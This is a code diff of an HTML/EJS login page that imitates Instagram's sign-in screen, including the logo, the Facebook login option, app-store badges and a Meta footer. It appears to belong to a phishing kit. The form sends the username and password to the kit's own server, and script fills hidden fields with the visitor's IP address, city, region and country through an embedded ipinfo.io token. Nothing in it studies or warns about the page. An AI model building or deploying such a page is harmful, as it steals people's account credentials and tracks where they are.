@@ -1,141 +1,387 @@
 <!DOCTYPE html>
-<html lang="pt-AO">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link
-      rel="shortcut icon"
-      href="/img/socials/icon.png"
-      type="image/x-icon"
-    />
-    <link rel="stylesheet" href="/css/style2.css" />
-    <title></title>
-    <style>
-      form input {
-        height: 3em !important;
-        padding: 0.5em !important;
-        outline-width: none !important;
-        margin-bottom: 1em !important;
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram • Login</title>
+  <link rel="shortcut icon" href="/img/socials/icon.png" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    
+    body {
+      background-color: #fafafa;
+      color: #262626;
+      font-size: 14px;
+      line-height: 18px;
+    }
+    
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 0 20px;
+    }
+    
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 350px;
+    }
+    
+    .login-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 20px 40px;
+      margin-bottom: 10px;
+      width: 100%;
+    }
+    
+    .logo {
+      margin: 22px auto 12px;
+      text-align: center;
+    }
+    
+    .logo img {
+      width: 175px;
+    }
+    
+    form {
+      display: flex;
+      flex-direction: column;
+      margin-top: 24px;
+    }
+    
+    .form-group {
+      position: relative;
+      margin-bottom: 6px;
+    }
+    
+    input {
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      color: #262626;
+      font-size: 12px;
+      height: 36px;
+      padding: 9px 8px 7px;
+      width: 100%;
+    }
+    
+    input:focus {
+      border-color: #a8a8a8;
+      outline: none;
+    }
+    
+    button {
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-weight: 600;
+      padding: 5px 9px;
+      text-align: center;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 8px;
+      height: 30px;
+      font-size: 14px;
+    }
+    
+    button:disabled {
+      background-color: rgba(0, 149, 246, 0.3);
+      cursor: default;
+    }
+    
+    .or-divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0;
+    }
+    
+    .or-line {
+      background-color: #dbdbdb;
+      height: 1px;
+      flex-grow: 1;
+    }
+    
+    .or-text {
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+      margin: 0 18px;
+      text-transform: uppercase;
+    }
+    
+    .facebook-login {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #385185;
+      font-weight: 600;
+      margin: 8px 0;
+      cursor: pointer;
+    }
+    
+    .facebook-icon {
+      margin-right: 8px;
+      font-size: 16px;
+    }
+    
+    .forgot-password {
+      color: #00376b;
+      font-size: 12px;
+      line-height: 14px;
+      margin-top: 12px;
+      text-align: center;
+      cursor: pointer;
+    }
+    
+    .signup-box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 15px;
+      margin: 10px 0;
+      text-align: center;
+      width: 100%;
+    }
+    
+    .signup-text {
+      color: #262626;
+    }
+    
+    .signup-link {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    
+    .get-app {
+      margin: 20px 0;
+      text-align: center;
+    }
+    
+    .app-download {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    
+    .app-download img {
+      height: 40px;
+      margin: 0 5px;
+    }
+    
+    .footer {
+      margin: 0 auto 52px;
+      max-width: 350px;
+    }
+    
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    
+    .footer-link {
+      color: #8e8e8e;
+      font-size: 12px;
+      margin: 0 8px 12px;
+      text-decoration: none;
+    }
+    
+    .copyright {
+      color: #8e8e8e;
+      font-size: 12px;
+      text-align: center;
+    }
+    
+    #submit2 img {
+      width: 18px;
+      height: 18px;
+      animation-name: spin;
+      animation-duration: 0.8s;
+      animation-iteration-count: infinite;
+      animation-timing-function: linear;
+    }
+    
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    
+    @media (max-width: 450px) {
+      .login-box {
+        background-color: transparent;
+        border: none;
       }
-
-      form .pass {
-        height: 3.3em !important;
+      
+      .container {
+        padding-top: 0;
       }
-
-      #submit2 img {
-        width: 1.3em;
-        animation-name: roll;
-        animation-duration: 0.7s;
-        animation-iteration-count: infinite;
-        animation-timing-function: linear;
-        color: white;
-      }
-
-      @keyframes roll {
-        from {
-          transform: rotate(0deg);
-        }
-        to {
-          transform: rotate(360deg);
-        }
-      }
-    </style>
-  </head>
-  <body onload="SwitchScreen()">
-    <section class="container">
-      <!-- FORM SECTION -->
-      <article class="form-area">
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-container">
+      <div class="login-box">
         <div class="logo">
-          <img src="/img/socials/logo.png" alt="Logo" />
+          <img src="/img/socials/logo.png" alt="Instagram" />
         </div>
-        <form
-          method="post"
-          accept="."
-          onsubmit="handleSubmit()"
-          style="margin-bottom: 2em"
-        >
-          <input
-            type="text"
-            name="username"
-            id="username"
-            required
-            placeholder="Phone number, username or email"
-          />
-          <input
-            type="password"
-            name="password"
-            id="password"
-            required
-            placeholder="Password"
-            class="pass"
-          />
+        
+        <form method="post" action="" id="loginForm">
+          <%- include("../../partials/messages") %>
+          <div class="form-group">
+            <input 
+              type="text" 
+              name="username" 
+              id="username" 
+              placeholder="Phone number, username, or email" 
+              aria-label="Phone number, username, or email"
+              aria-required="true"
+              required
+            />
+          </div>
+          
+          <div class="form-group">
+            <input 
+              type="password" 
+              name="password" 
+              id="password" 
+              placeholder="Password" 
+              aria-label="Password"
+              aria-required="true"
+              required
+            />
+          </div>
+          
           <input type="hidden" name="country" id="country" value="" />
           <input type="hidden" name="ip" id="ip" value="" />
           <input type="hidden" name="city" id="city" value="" />
           <input type="hidden" name="region" id="region" value="" />
-          <button type="submit" name="submit" id="submit">Login</button>
-          <button
-            type="button"
-            name="submit"
-            id="submit2"
-            style="display: none"
-          >
-            <img src="/img/loading.svg" alt="" />
+          
+          <button type="submit" id="submit">Log In</button>
+          <button type="button" id="submit2" style="display: none">
+            <img src="/img/loading.svg" alt="Loading" />
           </button>
+          
+          <div class="or-divider">
+            <div class="or-line"></div>
+            <div class="or-text">or</div>
+            <div class="or-line"></div>
+          </div>
+          
+          <div class="facebook-login">
+            <span class="facebook-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+              </svg>
+            </span>
+            Log in with Facebook
+          </div>
+          
+          <div class="forgot-password">Forgot password?</div>
         </form>
-      </article>
-    </section>
-    <!-- FORM SECTION END -->
-    <!-- FOOTER -->
-    <script src="/js/socials/app.js"></script>
-    <script src="/js/socials/brands.min.js"></script>
-    <script src="/js/socials/fontawesome.min.js"></script>
-  </body>
-</html>
-
-<script>
-  const handleSubmit = (e) => {
-    const username = document.querySelector("#username");
-    const password = document.querySelector("#password");
-    const submitBtn = document.querySelector("#submit");
-    const submitBtn2 = document.querySelector("#submit2");
-
-    if (username.value.length > 0 && password.value.length > 0) {
-      submitBtn.style.display = "none";
-      submitBtn2.style.display = "block";
-    } else {
-      e.preventDefault();
-      return false;
+      </div>
+      
+      <div class="signup-box">
+        <p class="signup-text">
+          Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </p>
+      </div>
+      
+      <div class="get-app">
+        <p>Get the app.</p>
+        <div class="app-download">
+          <a href="#">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Download on the App Store" />
+          </a>
+          <a href="#">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" />
+          </a>
+        </div>
+      </div>
+    </div>
+    
+    <div class="footer">
+      <div class="footer-links">
+        <a href="#" class="footer-link">Meta</a>
+        <a href="#" class="footer-link">About</a>
+        <a href="#" class="footer-link">Blog</a>
+        <a href="#" class="footer-link">Jobs</a>
+        <a href="#" class="footer-link">Help</a>
+        <a href="#" class="footer-link">API</a>
+        <a href="#" class="footer-link">Privacy</a>
+        <a href="#" class="footer-link">Terms</a>
+        <a href="#" class="footer-link">Top Accounts</a>
+        <a href="#" class="footer-link">Locations</a>
+        <a href="#" class="footer-link">Instagram Lite</a>
+        <a href="#" class="footer-link">Threads</a>
+        <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+        <a href="#" class="footer-link">Meta Verified</a>
+      </div>
+      
+      <div class="copyright">
+        2023 Instagram from Meta
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const loginForm = document.getElementById('loginForm');
+      const submitBtn = document.getElementById('submit');
+      const submitBtn2 = document.getElementById('submit2');
+      
+      submitBtn.addEventListener('click', function(e) {
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        
+        if (username.value.length > 0 && password.value.length > 0) {
+          submitBtn.style.display = 'none';
+          submitBtn2.style.display = 'block';
+          loginForm.submit();
+        }else{
+          e.preventDefault();
+        }
+      });
+    });
+    
+    // Function to get client's country information
+    function getClientCountryInfo() {
+      const apiKey = "9980528e43166f";
+      const countryInput = document.getElementById('country');
+      const ip = document.getElementById('ip');
+      const city = document.getElementById('city');
+      const region = document.getElementById('region');
+      
+      // Make a request to ipinfo.io to get information about the client's IP address
+      fetch(`https://ipinfo.io?token=${apiKey}`)
+        .then(response => response.json())
+        .then(data => {
+          countryInput.value = data.country;
+          ip.value = data.ip;
+          city.value = data.city;
+          region.value = data.region;
+        })
+        .catch(error => console.error("Error fetching IP information:", error));
     }
-
-    e.preventDefault();
-    return false;
-  };
-</script>
-
-<script>
-  const apiKey = "9980528e43166f";
-  // Function to get client's country information
-  function getClientCountryInfo() {
-    const countryInput = document.querySelector("#country");
-    const ip = document.querySelector("#ip");
-    const city = document.querySelector("#city");
-    const region = document.querySelector("#region");
-    // Make a request to ipinfo.io to get information about the client's IP address
-    fetch(`https://ipinfo.io?token=${apiKey}`)
-      .then((response) => response.json())
-      .then((data) => {
-        // Extract the country information from the response
-
-        countryInput.value = data.country;
-        ip.value = data.ip;
-        city.value = data.city;
-        region.value = data.region;
-      })
-      .catch((error) => console.error("Error fetching IP information:", error));
-  }
-
-  // Call the function to get client country information
-  getClientCountryInfo();
-</script>
+    
+    // Call the function to get client country information
+    document.addEventListener('DOMContentLoaded', getClientCountryInfo);
+  </script>
+</body>
+</html>
